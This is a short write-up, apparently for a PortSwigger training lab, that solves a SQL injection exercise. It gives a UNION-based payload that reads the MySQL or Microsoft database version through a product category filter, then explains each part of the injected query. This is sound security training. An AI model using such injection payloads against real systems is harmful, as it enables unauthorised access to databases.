# Lab-4: [SQL injection attack, querying the database type and version on MySQL and Microsoft](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-mysql-microsoft)

This lab contains a SQL injection vulnerability in the product category filter. You can use a UNION attack to retrieve the results from an injected query. 

**Aim :-** To solve the lab, display the database version string.


## Solution
- When select a category the query will look like the following
    ``` SELECT * FROM products WHERE category = '<category-name>' AND released = 1 ```

- Use the payload ``` ' UNION SELECT @@version, null-- # ``` which will make the query like the following
    ``` SELECT * FROM products WHERE category = '<category-name>' UNION SELECT @@version, null-- # ' AND released = 1 ```

### Explanation
- ``` UNION ``` Merges two select query together.
- ``` @@version ``` Retrieves the database version.
- ``` null ``` Is used to match the column numbers, if the column number doesn't match query breaks.
- ``` -- # ``` Tells SQL to ignore everything after it, So the query will execute like the follow
    ``` SELECT * FROM products WHERE category = '<category-name>' UNION SELECT @@version, null-- # ``` 
